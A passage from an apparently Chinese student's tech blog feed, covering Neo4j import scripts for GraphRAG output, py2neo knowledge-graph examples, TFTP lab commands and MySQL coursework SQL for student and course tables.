1. Import Documents</span><br><span class="line">LOAD CSV WITH HEADERS FROM &#x27;file:///create_final_documents.csv&#x27; AS row</span><br><span class="line">CREATE (d:Document &#123;</span><br><span class="line">    id: row.id,</span><br><span class="line">    title: row.title,</span><br><span class="line">    raw_content: row.raw_content,</span><br><span class="line">    text_unit_ids: row.text_unit_ids</span><br><span class="line">&#125;);</span><br><span class="line">    </span><br><span class="line">// 2. Import Text Units</span><br><span class="line">LOAD CSV WITH HEADERS FROM &#x27;file:///create_final_text_units.csv&#x27; AS row</span><br><span class="line">CREATE (t:TextUnit &#123;</span><br><span class="line">    id: row.id,</span><br><span class="line">    text: row.text,</span><br><span class="line">    n_tokens: toFloat(row.n_tokens),</span><br><span class="line">    document_ids: row.document_ids,</span><br><span class="line">    entity_ids: row.entity_ids,</span><br><span class="line">    relationship_ids: row.relationship_ids</span><br><span class="line">&#125;);</span><br><span class="line">    </span><br><span class="line">// 3. Import Entities</span><br><span class="line">LOAD CSV WITH HEADERS FROM &#x27;file:///create_final_entities.csv&#x27; AS row</span><br><span class="line">CREATE (e:Entity&#123;</span><br><span class="line">    id: row.id,</span><br><span class="line">    name: row.name,</span><br><span class="line">    type: row.type,</span><br><span class="line">    description: row.description,</span><br><span class="line">    human_readable_id: toInteger(row.human_readable_id),</span><br><span class="line">    text_unit_ids: row.text_unit_ids</span><br><span class="line">&#125;);</span><br><span class="line">    </span><br><span class="line">// 4. Import Relationships</span><br><span class="line">LOAD CSV WITH HEADERS FROM &#x27;file:///create_final_relationships.csv&#x27; AS row</span><br><span class="line">CREATE (r:Relationship &#123;</span><br><span class="line">    source: row.source,</span><br><span class="line">    target: row.target,</span><br><span class="line">    weight: toFloat(row.weight),</span><br><span class="line">    description: row.description,</span><br><span class="line">    id: row.id,</span><br><span class="line">    human_readable_id: row.human_readable_id,</span><br><span class="line">    source_degree: toInteger(row.source_degree),</span><br><span class="line">    target_degree: toInteger(row.target_degree),</span><br><span class="line">    rank: toInteger(row.rank),</span><br><span class="line">    text_unit_ids: row.text_unit_ids</span><br><span class="line">&#125;);</span><br><span class="line">    </span><br><span class="line">// 5. Import Nodes</span><br><span class="line">LOAD CSV WITH HEADERS FROM &#x27;file:///create_final_nodes.csv&#x27; AS row</span><br><span class="line">CREATE (n:Node &#123;</span><br><span class="line">    id: row.id,</span><br><span class="line">    level: toInteger(row.level),</span><br><span class="line">    title: row.title,</span><br><span class="line">    type: row.type,</span><br><span class="line">    description: row.description,</span><br><span class="line">    source_id: row.source_id,</span><br><span class="line">    community: row.community,</span><br><span class="line">    degree: toInteger(row.degree),</span><br><span class="line">    human_readable_id: row.human_readable_id,</span><br><span class="line">    size: toInteger(row.size),</span><br><span class="line">    entity_type: row.entity_type,</span><br><span class="line">    top_level_node_id: row.top_level_node_id,</span><br><span class="line">    x: toInteger(row.x),</span><br><span class="line">    y: toInteger(row.y)</span><br><span class="line">&#125;);</span><br><span class="line">    </span><br><span class="line">// 6. Import Communities</span><br><span class="line">LOAD CSV WITH HEADERS FROM &#x27;file:///create_final_communities.csv&#x27; AS row</span><br><span class="line">CREATE (c:Community &#123;</span><br><span class="line">    id: row.id,</span><br><span class="line">    title: row.title,</span><br><span class="line">    level: toInteger(row.level),</span><br><span class="line">    raw_community: row.raw_community,</span><br><span class="line">    relationship_ids: row.relationship_ids,</span><br><span class="line">    text_unit_ids: row.text_unit_ids</span><br><span class="line">&#125;);</span><br><span class="line">    </span><br><span class="line">// 7. Import Community Reports</span><br><span class="line">LOAD CSV WITH HEADERS FROM &#x27;file:///create_final_community_reports.csv&#x27; AS row</span><br><span class="line">CREATE (cr:CommunityReport &#123;</span><br><span class="line">    id: row.id,</span><br><span class="line">    community: row.community,</span><br><span class="line">    full_content: row.full_content,</span><br><span class="line">    level: toInteger(row.level),</span><br><span class="line">    rank: toFloat(row.rank),</span><br><span class="line">    title: row.title,</span><br><span class="line">    rank_explanation: row.rank_explanation,</span><br><span class="line">    summary: row.summary,</span><br><span class="line">    findings: row.findings,</span><br><span class="line">    full_content_json: row.full_content_json</span><br><span class="line">&#125;);</span><br><span class="line">    </span><br><span class="line">// 8. Create indexes for better performance</span><br><span class="line">CREATE INDEX FOR (d:Document) ON (d.id);</span><br><span class="line">CREATE INDEX FOR (t:TextUnit) ON (t.id);</span><br><span class="line">CREATE INDEX FOR (e:Entity) ON (e.id);</span><br><span class="line">CREATE INDEX FOR (r:Relationship) ON (r.id);</span><br><span class="line">CREATE INDEX FOR (n:Node) ON (n.id);</span><br><span class="line">CREATE INDEX FOR (c:Community) ON (c.id);</span><br><span class="line">CREATE INDEX FOR (cr:CommunityReport) ON (cr.id);</span><br><span class="line">    </span><br><span class="line">// 9. Create relationships after all nodes are imported</span><br><span class="line">MATCH (d:Document)</span><br><span class="line">UNWIND split(d.text_unit_ids, &#x27;,&#x27;) AS textUnitId</span><br><span class="line">MATCH (t:TextUnit &#123;id: trim(textUnitId)&#125;)</span><br><span class="line">CREATE (d)-[:HAS_TEXT_UNIT]-&gt;(t);</span><br><span class="line">    </span><br><span class="line">MATCH (t:TextUnit)</span><br><span class="line">UNWIND split(t.entity_ids, &#x27;,&#x27;) AS entityId</span><br><span class="line">MATCH (e:Entity &#123;id: trim(entityId)&#125;)</span><br><span class="line">CREATE (t)-[:HAS_ENTITY]-&gt;(e);</span><br><span class="line">    </span><br><span class="line">MATCH (t:TextUnit)</span><br><span class="line">UNWIND split(t.relationship_ids, &#x27;,&#x27;) AS relId</span><br><span class="line">MATCH (r:Relationship &#123;id: trim(relId)&#125;)</span><br><span class="line">CREATE (t)-[:HAS_RELATIONSHIP]-&gt;(r);</span><br><span class="line">    </span><br><span class="line">MATCH (e:Entity)</span><br><span class="line">UNWIND split(e.text_unit_ids, &#x27;,&#x27;) AS textUnitId</span><br><span class="line">MATCH (t:TextUnit &#123;id: trim(textUnitId)&#125;)</span><br><span class="line">CREATE (e)-[:MENTIONED_IN]-&gt;(t);</span><br><span class="line">    </span><br><span class="line">MATCH (r:Relationship)</span><br><span class="line">MATCH (source:Entity &#123;name: r.source&#125;)</span><br><span class="line">MATCH (target:Entity &#123;name: r.target&#125;)</span><br><span class="line">CREATE (source)-[:RELATES_TO]-&gt;(target);</span><br><span class="line">    </span><br><span class="line">MATCH (r:Relationship)</span><br><span class="line">UNWIND split(r.text_unit_ids, &#x27;,&#x27;) AS textUnitId</span><br><span class="line">MATCH (t:TextUnit &#123;id: trim(textUnitId)&#125;)</span><br><span class="line">CREATE (r)-[:MENTIONED_IN]-&gt;(t);</span><br><span class="line">    </span><br><span class="line">MATCH (c:Community)</span><br><span class="line">UNWIND split(c.relationship_ids, &#x27;,&#x27;) AS relId</span><br><span class="line">MATCH (r:Relationship &#123;id: trim(relId)&#125;)</span><br><span class="line">CREATE (c)-[:HAS_RELATIONSHIP]-&gt;(r);</span><br><span class="line">    </span><br><span class="line">MATCH (c:Community)</span><br><span class="line">UNWIND split(c.text_unit_ids, &#x27;,&#x27;) AS textUnitId</span><br><span class="line">MATCH (t:TextUnit &#123;id:trim(textUnitId)&#125;)</span><br><span class="line">CREATE (c)-[:HAS_TEXT_UNIT]-&gt;(t);</span><br><span class="line">    </span><br><span class="line">MATCH (cr:CommunityReport)</span><br><span class="line">MATCH (c:Community &#123;id: cr.community&#125;)</span><br><span class="line">CREATE (cr)-[:REPORTS_ON]-&gt;(c);</span><br></pre></td></tr></table></figure><p>最好在运行这段命令之前nei4j数据库没有其他的节点数据，最好是一次性完成。</p></li></ol><p>如果出现报错，最简单的方法是重新解压原来的压缩包，重新开一个新的数据库，然后重复之前的操作</p><h3 id="2-3-自行创建简单图谱示例"><a href="#2-3-自行创建简单图谱示例" class="headerlink" title="2.3 自行创建简单图谱示例"></a>2.3 自行创建简单图谱示例</h3><p>安装依赖库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install py2neo</span><br></pre></td></tr></table></figure><p>以下代码是一个简单的图谱生成示例:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">import py2neo</span><br><span class="line">from py2neo import Graph, Node, Relationship, NodeMatcher</span><br><span class="line"></span><br><span class="line">g = Graph(&quot;neo4j://localhost:7687&quot;, user=&quot;neo4j&quot;, password=&quot;&quot;)  # 填入自己的用户名和密码</span><br><span class="line"></span><br><span class="line">g.run(&#x27;match (n) detach delete n&#x27;)  # 运行neo4j自己的命令，删除所有节点</span><br><span class="line"></span><br><span class="line"># 创建节点，指定标签并命名</span><br><span class="line">testnode1 = Node(&quot;Person&quot;, name=&quot;刘备&quot;)</span><br><span class="line">testnode2 = Node(&quot;Person&quot;, name=&quot;关羽&quot;)</span><br><span class="line">testnode3 = Node(&quot;Person&quot;, name=&quot;张飞&quot;)</span><br><span class="line"></span><br><span class="line"># 构建节点属性</span><br><span class="line"># 也可以在创建时设置，如testnode1 = Node(&quot;Person&quot;, name=&quot;刘备&quot;, country=&quot;蜀国&quot;, age=40, sex=&quot;男&quot;)</span><br><span class="line">testnode1[&#x27;country&#x27;] = &#x27;蜀国&#x27;</span><br><span class="line">testnode1[&#x27;age&#x27;] = 40</span><br><span class="line">testnode1[&#x27;sex&#x27;] = &#x27;男&#x27;</span><br><span class="line"></span><br><span class="line">testnode2[&#x27;country&#x27;] = &#x27;蜀国&#x27;</span><br><span class="line">testnode2[&#x27;age&#x27;] = 35</span><br><span class="line">testnode2[&#x27;sex&#x27;] = &#x27;男&#x27;</span><br><span class="line"></span><br><span class="line">testnode3[&#x27;country&#x27;] = &#x27;蜀国&#x27;</span><br><span class="line">testnode3[&#x27;age&#x27;] = 30</span><br><span class="line">testnode3[&#x27;sex&#x27;] = &#x27;男&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 无条件创建节点，必定会增加节点，不论是否与之前已有的节点重复</span><br><span class="line"># g.create(testnode1)</span><br><span class="line"># g.create(testnode2)</span><br><span class="line"># g.create(testnode3)</span><br><span class="line"></span><br><span class="line"># 覆盖式创建节点，根据给定条件进行覆盖创建</span><br><span class="line">g.merge(testnode1, &quot;People&quot;, &quot;name&quot;)</span><br><span class="line">g.merge(testnode2, &quot;People&quot;, &quot;name&quot;)</span><br><span class="line">g.merge(testnode3, &quot;People&quot;, &quot;name&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 构建关系</span><br><span class="line">friend1 = Relationship(testnode1, &quot;大哥&quot;, testnode2)</span><br><span class="line">friend2 = Relationship(testnode2, &quot;二弟&quot;, testnode1)</span><br><span class="line">friend3 = Relationship(testnode1, &quot;大哥&quot;, testnode3)</span><br><span class="line">friend4 = Relationship(testnode3, &quot;三弟&quot;, testnode1)</span><br><span class="line">friend5 = Relationship(testnode2, &quot;二哥&quot;, testnode3)</span><br><span class="line">friend6 = Relationship(testnode3, &quot;三弟&quot;, testnode2)</span><br><span class="line">g.merge(friend1, &quot;Person&quot;, &quot;name&quot;)</span><br><span class="line">g.merge(friend2, &quot;Person&quot;, &quot;name&quot;)</span><br><span class="line">g.merge(friend3, &quot;Person&quot;, &quot;name&quot;)</span><br><span class="line">g.merge(friend4, &quot;Person&quot;, &quot;name&quot;)</span><br><span class="line">g.merge(friend5, &quot;Person&quot;, &quot;name&quot;)</span><br><span class="line">g.merge(friend6, &quot;Person&quot;, &quot;name&quot;)</span><br><span class="line"></span><br><span class="line"># 查询相关属性</span><br><span class="line">matcher = NodeMatcher(g)</span><br><span class="line">print(matcher.match(&quot;Person&quot;, name=&quot;张飞&quot;).first())</span><br></pre></td></tr></table></figure><p>生成效果:<br><img src="/img/AI_project/KnowledgeGraph/6.png" alt="image">  </p><h3 id="2-4-知识图谱构建案例分析"><a href="#2-4-知识图谱构建案例分析" class="headerlink" title="2.4 知识图谱构建案例分析"></a>2.4 知识图谱构建案例分析</h3><h4 id="2-4-1-红楼梦人物关系图谱构建"><a href="#2-4-1-红楼梦人物关系图谱构建" class="headerlink" title="2.4.1 红楼梦人物关系图谱构建"></a>2.4.1 红楼梦人物关系图谱构建</h4><ol><li>构建方法:通过已搜集好的人物关系表格构建知识图谱，表格样式如下:<br><img src="/img/AI_project/KnowledgeGraph/7.png" alt="image"><br>表格中已经非常明确的给出了各节点之间的关系。</li><li>代码: <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">from py2neo import Graph,Node,Relationship,NodeMatcher</span><br><span class="line">#账号密码改为自己的即可</span><br><span class="line">g=Graph(&#x27;neo4j://localhost:7687&#x27;,user=&#x27;neo4j&#x27;,password=&#x27;&#x27;)</span><br><span class="line">g.run(&#x27;match (n) detach delete n&#x27;)</span><br><span class="line">with open(&#x27;hlm.txt&#x27;,&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">    reader=csv.reader(f)</span><br><span class="line">    for item in reader:</span><br><span class="line">        if reader.line_num==1:</span><br><span class="line">            continue</span><br><span class="line">        print(&quot;当前行数：&quot;,reader.line_num,&quot;当前内容：&quot;,item)</span><br><span class="line">        start_node=Node(&quot;Person&quot;,name=item[0])</span><br><span class="line">        end_node=Node(&quot;Person&quot;,name=item[1])</span><br><span class="line">        relation=Relationship(start_node,item[3],end_node)</span><br><span class="line">        g.merge(start_node,&quot;Person&quot;,&quot;name&quot;)</span><br><span class="line">        g.merge(end_node,&quot;Person&quot;,&quot;name&quot;)</span><br><span class="line">        g.merge(relation,&quot;Person&quot;,&quot;name&quot;)</span><br><span class="line">print(&#x27;end&#x27;)</span><br></pre></td></tr></table></figure></li><li>优劣性说明<br>这种方法来得最直接，不过需要费时间搜集或者自己整理出相关的关系数据，整理出这样一份表格。</li></ol><h4 id="2-4-2-借助AI大模型进行知识图谱构建"><a href="#2-4-2-借助AI大模型进行知识图谱构建" class="headerlink" title="2.4.2 借助AI大模型进行知识图谱构建"></a>2.4.2 借助AI大模型进行知识图谱构建</h4><p>这种方法非常类似GraphRAG，直接将文本输给gpt，然后提出类似“请抽取其中的实体和实体间的关系，并生成neo4j代码”的要求，剩下的工作便可交给gpt完成。<br>GraphRAG只不过是让这一过程自动化进行，其中真正来处理文本，抽取实体等工作还是交给了大模型。  </p><h4 id="2-4-3-医疗知识图谱构建"><a href="#2-4-3-医疗知识图谱构建" class="headerlink" title="2.4.3 医疗知识图谱构建"></a>2.4.3 医疗知识图谱构建</h4><p><a href="https://github.com/liuhuanyong/QASystemOnMedicalKG">项目源地址</a><br>与红楼梦人物知识图谱构建所需的数据格式类似，需要整理好的数据<br>不同的是项目还提供了爬虫模块，支持从指定的网站上爬取信息，并对信息进行数据整理以达到可以进行图谱构建的目的。<br>项目还有问答功能，不用api接口实现。</p>]]></content>
      
      
      <categories>
          
          <category> 智能问答系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GraphRAG </tag>
            
            <tag> Neo4j </tag>
            
            <tag> 知识图谱 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络实验</title>
      <link href="/2024/10/07/2024-10-7-network/"/>
      <url>/2024/10/07/2024-10-7-network/</url>
      
        <content type="html"><![CDATA[<h3 id="交互命令"><a href="#交互命令" class="headerlink" title="交互命令"></a>交互命令</h3><ol><li>从服务器下载文件<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tftp -i &lt;服务器IP地址&gt; GET &lt;远程文件名&gt; &lt;本地保存文件名&gt;</span><br><span class="line"><span class="function">ex:</span></span><br><span class="line"><span class="function"><span class="title">tftp</span> -<span class="title">i</span> 127.0.0.1 <span class="title">GET</span> <span class="title">test.txt</span> <span class="title">C</span>:/<span class="title">user</span>/30905/<span class="title">Desktop</span></span></span><br></pre></td></tr></table></figure></li><li>向服务器上传文件<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tftp -i &lt;服务器IP地址&gt; PUT &lt;本地文件名&gt; &lt;远程保存文件名&gt;</span><br><span class="line"><span class="function">ex:</span></span><br><span class="line"><span class="function"><span class="title">tftp</span> -<span class="title">i</span> 127.0.0.1 <span class="title">PUT</span> <span class="title">test.txt</span> <span class="title">testfile.txt</span></span></span><br></pre></td></tr></table></figure></li><li>下载文件的netascii模式<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp &lt;服务器IP地址&gt; GET &lt;远程文件名&gt; </span><br></pre></td></tr></table></figure></li><li>上传文件的netascii模式<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp &lt;服务器IP地址&gt; PUT &lt;本地文件名&gt; </span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Network of computer </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hust </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库系统概论实验（一）</title>
      <link href="/2024/10/06/2024-10-6-mysql/"/>
      <url>/2024/10/06/2024-10-6-mysql/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"># 创建数据库</span><br><span class="line">create database CSEDB_U202312315;</span><br><span class="line">use CSEDB_U202312315;</span><br><span class="line"></span><br><span class="line"># 基本表操作</span><br><span class="line"># 学生表Student</span><br><span class="line">create table Student(</span><br><span class="line">    Sno char(5) not null unique,</span><br><span class="line">    Sname char(20) unique,</span><br><span class="line">    Ssex char(1),</span><br><span class="line">    Sage int,</span><br><span class="line">    Sdept char(15),</span><br><span class="line">    Scholarship char(2)</span><br><span class="line">);</span><br><span class="line"># 学生选课表</span><br><span class="line">create table SC(</span><br><span class="line">    Sno char(5),</span><br><span class="line">    Cno char(3),</span><br><span class="line">    Grade int,</span><br><span class="line">    Primary Key(Sno,Cno)</span><br><span class="line">);</span><br><span class="line"># 课程表</span><br><span class="line">create table Course(</span><br><span class="line">    Cno char(3),</span><br><span class="line">    Cname char(40),</span><br><span class="line">    Cpno char(4),</span><br><span class="line">    Ccredit smallint</span><br><span class="line">);</span><br><span class="line"># 删除表</span><br><span class="line">drop table Student;</span><br><span class="line"></span><br><span class="line"># 向Student表中添加Scome列,数据类型为datetime</span><br><span class="line">alter table Student add Scome datetime;</span><br><span class="line"></span><br><span class="line"># 将Student表中Sage列的数据类型修改为smallint</span><br><span class="line"># alter table Student alter COLUMN Sage SMALLINT; 该数据库不支持该语句</span><br><span class="line">alter table Student modify column Sage smallint;</span><br><span class="line"></span><br><span class="line"># 在Student表的Sno列中创建一个名为Stusno的唯一索引,唯一索引意味着Sno列中的值不能重复</span><br><span class="line">create unique index Stusno on Student(Sno);</span><br><span class="line"># 在Course表的Cno列中创建一个名为Coucno的唯一索引,唯一索引意味着Cno列中的值不能重复</span><br><span class="line">create unique index Coucno on Course(Cno);</span><br><span class="line"># 在SC表的Sno列和Cno列创建一个名为Scno的复合索引,并指定Sno为升序,Cno为降序</span><br><span class="line">create unique index SCno on SC(Sno ASC, Cno DESC);</span><br><span class="line"># 删除索引</span><br><span class="line">drop index Stusno on Student;</span><br><span class="line"></span><br><span class="line"># 删除数据库</span><br><span class="line">drop database CSEDB_U202312315;</span><br><span class="line"></span><br><span class="line"># 创建数据库</span><br><span class="line">create database S_T_U202312315;</span><br><span class="line">use S_T_U202312315;</span><br><span class="line"></span><br><span class="line"># 创建表</span><br><span class="line">create table Student(</span><br><span class="line">    Sno char(9) primary key,</span><br><span class="line">    Sname char(20) unique,</span><br><span class="line">    Ssex char(2),</span><br><span class="line">    Sage smallint,</span><br><span class="line">    Sdept char(20),</span><br><span class="line">    Scholarship char(2)</span><br><span class="line">);</span><br><span class="line"># 表Course的主码为Cno,属性列Cpno(先修课)为外码,被参照表为Course,被参照列是Cno</span><br><span class="line">create table Course(</span><br><span class="line">    Cno char(4) primary key,</span><br><span class="line">    Cname char(40),</span><br><span class="line">    Cpno char(4),</span><br><span class="line">    Ccredit smallint,</span><br><span class="line">    foreign key (Cpno) references Course(Cno)</span><br><span class="line">);</span><br><span class="line"># 表SC的主码为(Sno, Cno),Sno和Cno均为外码,被参照表分别为Student和Course,被参照列分别为Student.Sno和Course.Cno</span><br><span class="line">create table SC(</span><br><span class="line">    Sno char(9),</span><br><span class="line">    Cno char(4),</span><br><span class="line">    Grade smallint,</span><br><span class="line">    primary key (Sno, Cno),</span><br><span class="line">    foreign key (Sno) references Student(Sno),</span><br><span class="line">    foreign key (Cno) references Course(Cno)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"># 插入数据</span><br><span class="line">insert into student values(&#x27;200215121&#x27;,&#x27;李勇&#x27;,&#x27;男&#x27;,20,&#x27;CS&#x27;,&#x27;否&#x27;);</span><br><span class="line">insert into student values(&#x27;200215122&#x27;,&#x27;刘晨&#x27;,&#x27;女&#x27;,19,&#x27;CS&#x27;,&#x27;否&#x27;);</span><br><span class="line">insert into student values(&#x27;200215123&#x27;,&#x27;王敏&#x27;,&#x27;女&#x27;,18,&#x27;MA&#x27;,&#x27;否&#x27;);</span><br><span class="line">insert into student values(&#x27;200215124&#x27;,&#x27;张立&#x27;,&#x27;男&#x27;,19,&#x27;IS&#x27;,&#x27;否&#x27;);</span><br><span class="line"></span><br><span class="line">insert into course values(&#x27;1&#x27;, &#x27;数据库&#x27;, NULL,4);</span><br><span class="line">insert into course values(&#x27;2&#x27;, &#x27;数学&#x27;, NULL,2);</span><br><span class="line">insert into course values(&#x27;3&#x27;, &#x27;信息系统&#x27;, NULL,4);</span><br><span class="line">insert into course values(&#x27;4&#x27;, &#x27;操作系统&#x27;, NULL,3);</span><br><span class="line">insert into course values(&#x27;5&#x27;, &#x27;数据结构&#x27;, NULL,4);</span><br><span class="line">insert into course values(&#x27;6&#x27;, &#x27;数据处理&#x27;, NULL, 2);</span><br><span class="line">insert into course values(&#x27;7&#x27;, &#x27;java&#x27;, NULL,4);</span><br><span class="line">update Course set Cpno = &#x27;5&#x27; where Cno = &#x27;1&#x27;;</span><br><span class="line">update Course set Cpno = &#x27;1&#x27; where Cno = &#x27;3&#x27;;</span><br><span class="line">update Course set Cpno = &#x27;6&#x27; where Cno = &#x27;4&#x27;;</span><br><span class="line">update Course set Cpno = &#x27;7&#x27; where Cno = &#x27;5&#x27;;</span><br><span class="line">update Course set Cpno = &#x27;6&#x27; where Cno = &#x27;7&#x27;;</span><br><span class="line"></span><br><span class="line">insert into SC values(&#x27;200215121&#x27;, &#x27;1&#x27;,92);</span><br><span class="line">insert into SC values(&#x27;200215121&#x27;, &#x27;2&#x27;,85);</span><br><span class="line">insert into SC values(&#x27;200215121&#x27;, &#x27;3&#x27;,88);</span><br><span class="line">insert into SC values(&#x27;200215122&#x27;, &#x27;2&#x27;,90);</span><br><span class="line">insert into SC values(&#x27;200215122&#x27;, &#x27;3&#x27;,80);</span><br><span class="line"></span><br><span class="line"># 查询语句</span><br><span class="line"># 4.6.1 基本练习</span><br><span class="line"># (1)SELECT语句的基本用法</span><br><span class="line">select Sno,Sname,Ssex,Sage,Sdept from Student;</span><br><span class="line"></span><br><span class="line"># (2)使用WHERE子句进行有条件的查询</span><br><span class="line">select Student.Sno,Student.Sname</span><br><span class="line">from Student,SC</span><br><span class="line">where Student.Sno =SC.Sno and sc.cNO=&#x27;2&#x27; AND SC.Grade&gt;90;</span><br><span class="line"># 使用join替换where的隐式连接</span><br><span class="line"># select Student.Sno,Student.Sname</span><br><span class="line"># from Student</span><br><span class="line"># join SC on Student.Sno = 